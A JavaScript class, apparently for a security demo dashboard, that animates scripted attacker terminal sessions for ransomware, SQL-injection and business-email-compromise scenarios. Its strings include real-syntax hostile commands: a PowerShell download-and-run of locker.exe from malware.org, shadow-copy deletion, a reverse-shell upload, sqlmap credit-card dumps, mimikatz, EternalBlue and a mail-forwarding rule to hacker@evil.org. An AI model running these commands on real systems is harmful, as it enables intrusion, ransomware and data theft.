/**
 * Attacker Terminal Simulator
 * Simulates real-time command line typing and exploit execution
 * Supports multiple IT scenarios (0: Active Directory, 1: Cloud E-Commerce, 2: BEC)
 */

class AttackerTerminal {
  constructor(containerId) {
    this.container = document.getElementById(containerId);
    this.currentTimeout = null;
    this.queue = [];
    this.isTyping = false;
    this.speedMultiplier = 1;
    this.currentPhase = -1;
    this.currentScenario = -1;

    // Headers per scenario
    this.headers = {
      0: `======================================================================
[+] SOURCE SPOOF: 185.220.101.4 (TOR EXIT NODE) -> TUN0 (10.10.14.88)
[+] ARCHITECTURE: x86_64 Linux 5.15.0-kali7-amd64
[+] TARGET SCOPE: 192.168.20.100 (Primary Domain Controller NTDS Database)
======================================================================\n\n`,
      1: `======================================================================
[+] SOURCE SPOOF: 189.124.99.112 (SOCKS5 PROXY) -> TUN1 (10.10.14.89)
[+] ARCHITECTURE: x86_64 Linux 5.10.0-kali9-amd64
[+] TARGET SCOPE: 10.0.1.20 (E-Commerce Web Portal SQLi API)
======================================================================\n\n`,
      2: `======================================================================
[+] SOURCE SPOOF: 45.227.254.12 (ESTONIAN VPS) -> TUN2 (10.10.14.90)
[+] ARCHITECTURE: x86_64 Windows Server 2019 (Spoofed Payload)
[+] TARGET SCOPE: 172.16.5.150 (Executive Workstation - BEC Target)
======================================================================\n\n`
    };
  }

  init() {
    this.clear();
    this.container.innerHTML = `<span class="text-neutral-500">// Terminal initialized. Awaiting orchestrator baseline...</span>`;
  }

  clear() {
    if (this.currentTimeout) {
      clearTimeout(this.currentTimeout);
      this.currentTimeout = null;
    }
    this.queue = [];
    this.isTyping = false;
    if (this.container) {
      this.container.innerHTML = "";
    }
  }

  setSpeed(multiplier) {
    this.speedMultiplier = multiplier;
  }

  /**
   * Main entry point to transition terminal script to a specific phase and scenario
   */
  triggerPhase(phase, scenarioId = 0, optionIndex = 0) {
    if (this.currentPhase === phase && this.currentScenario === scenarioId && this.currentOptionIndex === optionIndex) return;
    this.currentPhase = phase;
    this.currentScenario = scenarioId;
    this.currentOptionIndex = optionIndex;
    this.clear();

    // Setup color based on phase
    if (phase === 2) {
      this.container.className = "font-mono text-sm text-red-500 glow-text-red whitespace-pre-wrap leading-relaxed select-none";
    } else {
      this.container.className = "font-mono text-sm text-green-500 glow-text-green whitespace-pre-wrap leading-relaxed select-none";
    }

    // Load scripts
    let scripts = [];
    
    // Add standard header (except in phase 4 reset)
    if (phase !== 4) {
      scripts.push({ type: 'out', text: this.headers[scenarioId] || "", delay: 0 });
    }

    if (scenarioId === 0) {
      this.loadScenario0(scripts, phase, optionIndex);
    } else if (scenarioId === 1) {
      this.loadScenario1(scripts, phase, optionIndex);
    } else if (scenarioId === 2) {
      this.loadScenario2(scripts, phase, optionIndex);
    }

    this.queue = scripts;
    this.processQueue();
  }

  // --- SCENARIO 0: Active Directory Ransomware ---
  loadScenario0(scripts, phase, optionIndex = 0) {
    if (optionIndex === 1) {
      switch(phase) {
        case 0:
          scripts.push(
            { type: 'out', text: '[*] Activating high-frequency RDP/SMB logging audit...\n', delay: 100 },
            { type: 'cmd', text: 'ping -i 0.2 -c 10 192.168.20.100' },
            { type: 'out', text: 'PING 192.168.20.100 (192.168.20.100) 56(84) bytes of data.\n', delay: 100 },
            { type: 'out', text: '64 bytes from 192.168.20.100: icmp_seq=1 ttl=64 time=0.45 ms\n', delay: 100 },
            { type: 'out', text: '[+] 10 packets transmitted, 10 received, 0% packet loss.\n', delay: 100 },
            { type: 'out', text: '[+] Domain Controller ping polling baseline established.\n', delay: 100 }
          );
          break;
        case 1:
          scripts.push(
            { type: 'out', text: '[!] Mass port sweep initiated targeting Directory Shares Port 445.\n', delay: 100 },
            { type: 'cmd', text: 'masscan -p445 192.168.20.0/24 --rate=1000' },
            { type: 'out', text: 'Starting masscan v1.3 ( https://github.com/robertdavidgraham/masscan )\n', delay: 300 },
            { type: 'out', text: 'Discovered open port 445/tcp on 192.168.20.100\n', delay: 200 },
            { type: 'out', text: '[+] Active Directory controller discovered. Port 445 open.\n', delay: 100 }
          );
          break;
        case 2:
          scripts.push(
            { type: 'out', text: '[!] EXPLOITING DOMAIN CONTROLLER PRIVILEGE CONTROLS...\n', delay: 100 },
            { type: 'cmd', text: 'python3 exploit.py -t 192.168.20.100 -p 445 -o 0x7ffd5e2a' },
            { type: 'out', text: '[*] Sending buffer size 2048 to SMB interface...\n', delay: 300 },
            { type: 'out', text: '[+] Payload accepted. Hijacking instruction pointer...\n', delay: 200 },
            { type: 'out', text: '[+] Command Shell active: SYSTEM@domain-controller:/#\n', delay: 200 },
            { type: 'cmd', text: 'vssadmin delete shadows /all /quiet' }
          );
          break;
        case 3:
          scripts.push(
            { type: 'cmd', text: 'whoami' },
            { type: 'out', text: '\n[*] Executing remote commands... delay 5.4s\n', delay: 400 },
            { type: 'out', text: '[!] WARNING: Target coordinates changed to 192.168.20.150 (DECOY).\n', delay: 400 },
            { type: 'out', text: '[-] Access denied. Honeypot interaction detected.\n', delay: 300 }
          );
          break;
        case 4:
          scripts.push(
            { type: 'out', text: '[!] Resetting target Domain Controller Active Directory...\n', delay: 100 },
            { type: 'out', text: '[*] Restoring NTDS database from offline backup... DONE\n', delay: 200 },
            { type: 'out', text: '[+] System restored to safe directory defaults.\n', delay: 100 }
          );
          break;
      }
      return;
    }
    if (optionIndex === 2) {
      switch(phase) {
        case 0:
          scripts.push(
            { type: 'out', text: '[*] Auditing internal Kerberos ticket issuing pathways...\n', delay: 100 },
            { type: 'cmd', text: 'klist' },
            { type: 'out', text: 'Ticket cache: FILE:/tmp/krb5cc_1000\nDefault principal: admin@enterprise.local\n', delay: 150 },
            { type: 'out', text: '[+] Ticket-Granting Ticket (TGT) integrity verified.\n', delay: 100 }
          );
          break;
        case 1:
          scripts.push(
            { type: 'out', text: '[!] Phishing recon vector running against domain admins.\n', delay: 100 },
            { type: 'cmd', text: 'gophish -c config.json --template ad_update' },
            { type: 'out', text: '[*] Establishing tracking server on port 3333...\n', delay: 300 },
            { type: 'out', text: '[+] Email clicked by sysadmin-01@enterprise.local\n', delay: 250 },
            { type: 'out', text: '[+] Operator credentials harvested: user=sysadmin, pass=superPassword321\n', delay: 100 }
          );
          break;
        case 2:
          scripts.push(
            { type: 'out', text: '[!] INITIATING DIRECTORY POLICY OVERWRITE...\n', delay: 100 },
            { type: 'cmd', text: 'ssh administrator@192.168.20.100 "cmd /c gpupdate /force"' },
            { type: 'out', text: '[*] Injecting malicious GPO script rules...\n', delay: 300 },
            { type: 'out', text: '[!] WARNING: Group Policy updated. Network logins disabled.\n', delay: 200 }
          );
          break;
        case 3:
          scripts.push(
            { type: 'cmd', text: 'ssh administrator@192.168.20.100' },
            { type: 'out', text: '\n[-] Connection terminated by host. Reason: Account Revoked.\n', delay: 350 },
            { type: 'out', text: '[-] Connection closed.\n', delay: 100 }
          );
          break;
        case 4:
          scripts.push(
            { type: 'out', text: '[!] Enforcing strict multi-factor authentication policies...\n', delay: 100 },
            { type: 'out', text: '[-] Disabling legacy NTLM protocols... DONE\n', delay: 150 },
            { type: 'out', text: '[+] Active Directory security baseline restored.\n', delay: 100 }
          );
          break;
      }
      return;
    }

    switch(phase) {
      case 0:
        scripts.push(
          { type: 'out', text: '[*] Starting background intelligence sweep...\n', delay: 100 },
          { type: 'cmd', text: 'ping -c 4 192.168.20.100' },
          { type: 'out', text: 'PING 192.168.20.100 (192.168.20.100) 56(84) bytes of data.\n', delay: 150 },
          { type: 'out', text: '64 bytes from 192.168.20.100: icmp_seq=1 ttl=64 time=0.45 ms\n', delay: 200 },
          { type: 'out', text: '64 bytes from 192.168.20.100: icmp_seq=2 ttl=64 time=0.38 ms\n', delay: 200 },
          { type: 'out', text: '64 bytes from 192.168.20.100: icmp_seq=3 ttl=64 time=0.41 ms\n', delay: 200 },
          { type: 'out', text: '64 bytes from 192.168.20.100: icmp_seq=4 ttl=64 time=0.39 ms\n\n', delay: 200 },
          { type: 'out', text: '[+] Host 192.168.20.100 online. Directory response normal.\n', delay: 100 },
          { type: 'out', text: '[i] Next action queued: Network Port Scan (masscan/nmap).\n', delay: 100 }
        );
        break;

      case 1:
        scripts.push(
          { type: 'out', text: '[!] Scanning active directory servers and services...\n', delay: 100 },
          { type: 'cmd', text: 'nmap -sS -p 389,445,3389 192.168.20.100' },
          { type: 'out', text: 'Nmap scan report for domain-controller.enterprise.local (192.168.20.100)\n', delay: 300 },
          { type: 'out', text: 'PORT     STATE SERVICE\n', delay: 100 },
          { type: 'out', text: '389/tcp  open  ldap\n', delay: 100 },
          { type: 'out', text: '445/tcp  open  microsoft-ds\n', delay: 100 },
          { type: 'out', text: '3389/tcp open  ms-wbt-server\n\n', delay: 100 },
          { type: 'out', text: '[+] Directory services detected. Candidate exploit vector: SMB port 445.\n', delay: 150 }
        );
        break;

      case 2:
        scripts.push(
          { type: 'out', text: '[*] EXPLOITING SMB PORT 445 FOR ACTIVE DIRECTORY TAKEOVER...\n', delay: 100 },
          { type: 'cmd', text: 'python3 ticket_harvester.py -t 192.168.20.100 --kerberoast' },
          { type: 'out', text: '[*] Harvesting Kerberos service ticket (TGS) hashes...\n', delay: 250 },
          { type: 'out', text: '[+] Extracted ticket hash for admin principal: $krb5tgs$23$*admin...\n', delay: 150 },
          { type: 'cmd', text: 'hashcat -m 13100 admin_tgs.txt -a 0 wordlist.txt' },
          { type: 'out', text: '...Cracking progress: 100% [SUCCESS] Password found: Password123!\n', delay: 300 },
          { type: 'cmd', text: 'python3 impacket/psexec.py administrator:Password123!@192.168.20.100' },
          { type: 'out', text: '[+] Authenticated successfully. Spawning remote system shell...\n', delay: 200 },
          { type: 'out', text: 'C:\\Windows\\system32> powershell -c "Invoke-WebRequest -Uri http://malware.org/locker.exe -OutFile C:\\Windows\\Temp\\locker.exe; C:\\Windows\\Temp\\locker.exe --database C:\\Windows\\NTDS\\NTDS.dit"\n', delay: 400 },
          { type: 'out', text: '[!] CRYPTOLOCKER: ENCRYPTING AD DATABASE: NTDS.dit... DONE\n', delay: 200 },
          { type: 'out', text: '[!] ENTERPRISE NETWORK ACCESS LOCKED. AD CREDENTIALS CORRUPTED.\n', delay: 100 }
        );
        break;

      case 3:
        scripts.push(
          { type: 'cmd', text: 'net view /domain' },
          { type: 'out', text: '\n[-] Error: 53. Network path not found.\n', delay: 350 },
          { type: 'out', text: '[-] Connection dropped. Active Directory Segment quarantined.\n', delay: 300 },
          { type: 'out', text: '[-] Routing links isolated by SOAR firewall controller.\n', delay: 150 }
        );
        break;

      case 4:
        scripts.push(
          { type: 'out', text: '==================================================\n', delay: 100 },
          { type: 'out', text: '[!] Deleting session logs and Kerberos ticket cache...\n', delay: 150 },
          { type: 'out', text: '[-] Wiping locker traces from C:\\Windows\\Temp\\... DONE\n', delay: 100 },
          { type: 'out', text: '[i] Next campaign countdown starting...\n', delay: 100 }
        );
        break;
    }
  }

  // --- SCENARIO 1: Cloud E-Commerce Database Exfiltration ---
  loadScenario1(scripts, phase, optionIndex = 0) {
    if (optionIndex === 1) {
      switch(phase) {
        case 0:
          scripts.push(
            { type: 'out', text: '[*] Starting database query latency check...\n', delay: 100 },
            { type: 'cmd', text: 'nmap -p 8080 10.0.1.20' },
            { type: 'out', text: 'PORT     STATE SERVICE\n8080/tcp open  http-proxy\n', delay: 200 },
            { type: 'out', text: '[+] Database proxy interface responsive.\n', delay: 100 }
          );
          break;
        case 1:
          scripts.push(
            { type: 'out', text: '[!] Web directory brute-force initiated via dirb.\n', delay: 100 },
            { type: 'cmd', text: 'dirb http://10.0.1.20/ wordlist.txt' },
            { type: 'out', text: '[+] Found directory: http://10.0.1.20/api/v1/users [SUCCESS]\n', delay: 300 }
          );
          break;
        case 2:
          scripts.push(
            { type: 'out', text: '[!] UPLOADING PHP REVERSE SHELL TO EXPLOIT DIRECTORY...\n', delay: 100 },
            { type: 'cmd', text: 'curl -F "file=@shell.php" http://10.0.1.20/api/v1/upload' },
            { type: 'out', text: '[*] Remote command execution established: www-data@web-portal:/#\n', delay: 200 }
          );
          break;
        case 3:
          scripts.push(
            { type: 'cmd', text: 'whoami' },
            { type: 'out', text: '\n[-] Connection lost. Web shell process terminated by host.\n', delay: 300 }
          );
          break;
        case 4:
          scripts.push(
            { type: 'out', text: '[!] Restoring API server container from cloud snapshot...\n', delay: 100 },
            { type: 'out', text: '[+] Container deployment successful.\n', delay: 200 }
          );
          break;
      }
      return;
    }
    if (optionIndex === 2) {
      switch(phase) {
        case 0:
          scripts.push(
            { type: 'out', text: '[*] Starting Edge CDN integrity audit...\n', delay: 100 },
            { type: 'cmd', text: 'curl -I https://10.0.1.20/' },
            { type: 'out', text: 'HTTP/1.1 200 OK\nContent-Type: text/html\nX-Cache: HIT\n', delay: 150 },
            { type: 'out', text: '[+] CDN edge loops verified.\n', delay: 100 }
          );
          break;
        case 1:
          scripts.push(
            { type: 'out', text: '[!] Initiating credential stuffing against web portal...\n', delay: 100 },
            { type: 'cmd', text: 'python3 stuff.py --target http://10.0.1.20/api/login' },
            { type: 'out', text: '[+] Matching token recovered. JWT session hijacked.\n', delay: 250 }
          );
          break;
        case 2:
          scripts.push(
            { type: 'out', text: '[!] INITIATING DENIAL-OF-SERVICE ON SQL BACKEND...\n', delay: 100 },
            { type: 'cmd', text: 'sqlmap -u "http://10.0.1.20/api/v1/users?id=1" --dbms=mysql --delay=5 --sql-query="SELECT SLEEP(10)"' },
            { type: 'out', text: '[!] Alert: SQL database CPU usage 100%. Fail-safe lock active.\n', delay: 200 }
          );
          break;
        case 3:
          scripts.push(
            { type: 'cmd', text: 'exit' },
            { type: 'out', text: '\n[-] Connection refused. Web Application Firewall rate limits active.\n', delay: 350 }
          );
          break;
        case 4:
          scripts.push(
            { type: 'out', text: '[!] Re-writing API controller logic and enforcing parameterization...\n', delay: 100 },
            { type: 'out', text: '[+] Web portal SQL patches deployed.\n', delay: 150 }
          );
          break;
      }
      return;
    }

    switch(phase) {
      case 0:
        scripts.push(
          { type: 'out', text: '[*] Starting background web application monitoring...\n', delay: 100 },
          { type: 'cmd', text: 'ping -c 3 10.0.1.20' },
          { type: 'out', text: 'PING 10.0.1.20 (10.0.1.20) 56(84) bytes of data.\n', delay: 150 },
          { type: 'out', text: '64 bytes from 10.0.1.20: icmp_seq=1 ttl=64 time=0.82 ms\n', delay: 200 },
          { type: 'out', text: '64 bytes from 10.0.1.20: icmp_seq=2 ttl=64 time=0.79 ms\n', delay: 200 },
          { type: 'out', text: '64 bytes from 10.0.1.20: icmp_seq=3 ttl=64 time=0.81 ms\n\n', delay: 200 },
          { type: 'out', text: '[+] Host 10.0.1.20 online. Web portal response normal.\n', delay: 100 },
          { type: 'out', text: '[i] Next action: Web API scanner (sqlmap) queue.\n', delay: 100 }
        );
        break;

      case 1:
        scripts.push(
          { type: 'out', text: '[!] Running sqlmap scanner to locate database injection paths...\n', delay: 100 },
          { type: 'cmd', text: 'sqlmap -u "http://10.0.1.20/api/v1/users?id=1" --batch' },
          { type: 'out', text: 'custom parameter "id" appears to be injectable!\n', delay: 300 },
          { type: 'out', text: 'DBMS: MySQL 8.0.25 (Ubuntu linux)\n', delay: 100 },
          { type: 'out', text: '[+] SQL Injection vulnerability confirmed at /api/v1/users.\n', delay: 150 }
        );
        break;

      case 2:
        scripts.push(
          { type: 'out', text: '[*] EXTRACTING SCHEMAS AND DUMPING CUSTOMER DATABASE RECORDS...\n', delay: 100 },
          { type: 'cmd', text: 'sqlmap -u "http://10.0.1.20/api/v1/users?id=1" --dbms=mysql -D ecommerce -T clients -C email,password,credit_card --dump --batch' },
          { type: 'out', text: '[*] Retrieving database records...\n', delay: 300 },
          { type: 'out', text: '| admin@shop.local | $2b$12$Zad92... | 4000-1234-5678-9010 |\n', delay: 150 },
          { type: 'out', text: '| buyer@corp.local | $2b$12$Asa10... | 4111-2222-3333-4444 |\n', delay: 100 },
          { type: 'out', text: '[!] DATABASE DUMP EXFILTRATION COMPLETED (ecommerce.clients: 24,050 rows).\n', delay: 200 }
        );
        break;

      case 3:
        scripts.push(
          { type: 'cmd', text: 'sqlmap -u "http://10.0.1.20/api/v1/users?id=1" --dbs' },
          { type: 'out', text: '\n[!] CRITICAL ERROR: Connection dropped. Connection blocked by peer WAF.\n', delay: 350 },
          { type: 'out', text: '[-] Connection timed out. Target unreachable.\n', delay: 200 },
          { type: 'out', text: '[-] Attacker IP blocked by automated WAF containment rules.\n', delay: 150 }
        );
        break;

      case 4:
        scripts.push(
          { type: 'out', text: '==================================================\n', delay: 100 },
          { type: 'out', text: '[!] Closing SQLi sessions...\n', delay: 150 },
          { type: 'out', text: '[-] Purging request history... DONE\n', delay: 100 },
          { type: 'out', text: '[i] Next campaign countdown starting...\n', delay: 100 }
        );
        break;
    }
  }

  // --- SCENARIO 2: Corporate BEC Financial Fraud Campaign ---
  loadScenario2(scripts, phase, optionIndex = 0) {
    if (optionIndex === 1) {
      switch(phase) {
        case 0:
          scripts.push(
            { type: 'out', text: '[*] Starting executive workstation ping monitor...\n', delay: 100 },
            { type: 'cmd', text: 'ping -c 4 172.16.5.150' },
            { type: 'out', text: '64 bytes from 172.16.5.150: icmp_seq=1 ttl=128 time=1.24 ms\n', delay: 200 },
            { type: 'out', text: '[+] Workstation host online. Active responses normal.\n', delay: 100 }
          );
          break;
        case 1:
          scripts.push(
            { type: 'out', text: '[!] Auditing SMB protocols on accounting LAN...\n', delay: 100 },
            { type: 'cmd', text: 'nmap --script smb-vuln-ms17-010 -p 445 172.16.5.150' },
            { type: 'out', text: 'Host is vulnerable to MS17-010 (EternalBlue)\n', delay: 300 }
          );
          break;
        case 2:
          scripts.push(
            { type: 'out', text: '[!] EXPLOITING ETERNALBLUE SMB BACKDOOR ON WORKSTATION...\n', delay: 100 },
            { type: 'cmd', text: 'msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 172.16.5.150; run"' },
            { type: 'out', text: '[+] Meterpreter session 1 opened (10.10.14.90 -> 172.16.5.150:445)\n', delay: 300 },
            { type: 'cmd', text: 'getsystem' },
            { type: 'out', text: '...got system via Named Pipe Impersonation\n', delay: 250 }
          );
          break;
        case 3:
          scripts.push(
            { type: 'cmd', text: 'shell' },
            { type: 'out', text: '\n[-] Connection lost. Host isolated from corporate network.\n', delay: 300 }
          );
          break;
        case 4:
          scripts.push(
            { type: 'out', text: '[!] Restoring employee console OS from backup images...\n', delay: 100 },
            { type: 'out', text: '[+] OS golden image deploy complete.\n', delay: 200 }
          );
          break;
      }
      return;
    }
    if (optionIndex === 2) {
      switch(phase) {
        case 0:
          scripts.push(
            { type: 'out', text: '[*] Starting secure email gateway log sweep...\n', delay: 100 },
            { type: 'cmd', text: 'curl -s http://172.16.5.10:8001/mail/status' },
            { type: 'out', text: '{"status": "ACTIVE", "spf": "PASS", "dmarc": "PASS"}\n', delay: 150 },
            { type: 'out', text: '[+] Secure Email Gateway SPF/DMARC status healthy.\n', delay: 100 }
          );
          break;
        case 1:
          scripts.push(
            { type: 'out', text: '[!] Initiating Outlook Web Access login credentials stuffing...\n', delay: 100 },
            { type: 'cmd', text: 'python3 stuff_owa.py --url https://mail.enterprise.com/owa' },
            { type: 'out', text: '[+] Harvested valid session: exec_cfo / summer_pass_2026\n', delay: 250 }
          );
          break;
        case 2:
          scripts.push(
            { type: 'out', text: '[!] CREATING SILENT INCOMING MAIL FORWARDING RULES...\n', delay: 100 },
            { type: 'cmd', text: 'curl -X POST https://mail.enterprise.com/owa/api/rules -d "rule=forward_all&to=hacker@evil.org"' },
            { type: 'out', text: '[!] Alert: Inbound mail forwarding rule set. Transferring folders.\n', delay: 200 }
          );
          break;
        case 3:
          scripts.push(
            { type: 'cmd', text: 'exit' },
            { type: 'out', text: '\n[-] Connection dropped. Executive email session invalidated.\n', delay: 350 }
          );
          break;
        case 4:
          scripts.push(
            { type: 'out', text: '[!] Updating SPF, DKIM, and DMARC DNS records...\n', delay: 100 },
            { type: 'out', text: '[+] DNS records updated. Mail server sanitized.\n', delay: 150 }
          );
          break;
      }
      return;
    }

    switch(phase) {
      case 0:
        scripts.push(
          { type: 'out', text: '[*] Starting corporate network mapping...\n', delay: 100 },
          { type: 'cmd', text: 'nmap -PN -p 80,443 172.16.5.150' },
          { type: 'out', text: 'Nmap scan report for executive-workstation.local (172.16.5.150)\n', delay: 200 },
          { type: 'out', text: 'PORT    STATE SERVICE\n', delay: 50 },
          { type: 'out', text: '443/tcp open  https\n\n', delay: 50 },
          { type: 'out', text: '[+] Workstation online. Local secure services active.\n', delay: 100 }
        );
        break;

      case 1:
        scripts.push(
          { type: 'out', text: '[!] Initializing spear phishing attachment delivery sequence...\n', delay: 100 },
          { type: 'cmd', text: 'python3 send_phish.py --target cfo@enterprise.com --template invoice_payment' },
          { type: 'out', text: '[+] Email dispatched successfully (Ref: WIRE-TRANSFER-904)\n', delay: 200 },
          { type: 'out', text: '[*] Awaiting recipient document macro execution...\n', delay: 400 },
          { type: 'out', text: '[*] Word doc exploit triggered MSHTML vulnerability (CVE-2021-40444)\n', delay: 300 },
          { type: 'out', text: '[*] Backdoor shell established: 10.10.14.90:4444 <- 172.16.5.150:50124\n', delay: 100 },
          { type: 'out', text: '[i] Next action: Execute credential dump & session hijack.\n', delay: 100 }
        );
        break;

      case 2:
        scripts.push(
          { type: 'out', text: '[!] EXTRACTING CHROME AND OUTLOOK ACTIVE MAIL SESSION COOKIES...\n', delay: 100 },
          { type: 'cmd', text: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"' },
          { type: 'out', text: '[+] Logon credentials hijacked: executive_cfo / Password987\n', delay: 200 },
          { type: 'cmd', text: 'python3 session_hijack.py --cookie-db session.sqlite --inject' },
          { type: 'out', text: '\n[*] Mail session hijacked. Sending invoice change instructions to accounting...\n', delay: 300 },
          { type: 'out', text: '[!] BEC: Sending redirect email to vendor account payment portal... [OK]\n', delay: 150 },
          { type: 'out', text: '[!] BEC: Routing $180,000 corporate payment to external offshore escrow. [OK]\n', delay: 150 },
          { type: 'out', text: '[!] BEC: Deleting outgoing mail records to prevent operator detection.\n', delay: 100 },
          { type: 'out', text: '[!] FRAUD COMPLETE: SESSION CREDENTIALS HARVESTED. DATA COPIES LOCKED: .cryptolocker\n', delay: 200 }
        );
        break;

      case 3:
        scripts.push(
          { type: 'cmd', text: 'net use' },
          { type: 'out', text: '\n[-] Connection timed out. Session terminated.\n', delay: 400 },
          { type: 'out', text: '[-] Attempting to restore connection to 172.16.5.150...\n', delay: 300 },
          { type: 'out', text: '[-] Error: Destination host unreachable (VLAN isolated by SOAR).\n', delay: 300 },
          { type: 'out', text: '[-] Threat containment directive executing on targets. Account REVOKED.\n', delay: 150 }
        );
        break;

      case 4:
        scripts.push(
          { type: 'out', text: '==================================================\n', delay: 100 },
          { type: 'out', text: '[!] Closing SMTP backdoors and session tunnels...\n', delay: 150 },
          { type: 'out', text: '[-] Erasing mail server transaction trace logs... DONE\n', delay: 100 },
          { type: 'out', text: '[i] Next campaign countdown starting...\n', delay: 100 }
        );
        break;
    }
  }

  processQueue() {
    if (this.queue.length === 0) {
      this.isTyping = false;
      return;
    }

    this.isTyping = true;
    const item = this.queue.shift();

    if (item.type === 'out') {
      let text = item.text;
      let i = 0;
      const step = () => {
        if (!this.container) return;
        const chunk = text.substr(i, 3);
        this.container.innerHTML += chunk;
        i += 3;
        this.container.scrollTop = this.container.scrollHeight;
        if (i < text.length) {
          this.currentTimeout = setTimeout(step, item.delay / (this.speedMultiplier * 2));
        } else {
          this.processQueue();
        }
      };
      step();
    } else if (item.type === 'cmd') {
      let cmdText = "\n$ " + item.text + "\n";
      let i = 0;
      const step = () => {
        if (!this.container) return;
        const char = cmdText.charAt(i);
        this.container.innerHTML += char;
        i++;
        this.container.scrollTop = this.container.scrollHeight;
        if (i < cmdText.length) {
          this.currentTimeout = setTimeout(step, 40 / this.speedMultiplier);
        } else {
          this.processQueue();
        }
      };
      step();
    }
  }
}

window.AttackerTerminal = AttackerTerminal;
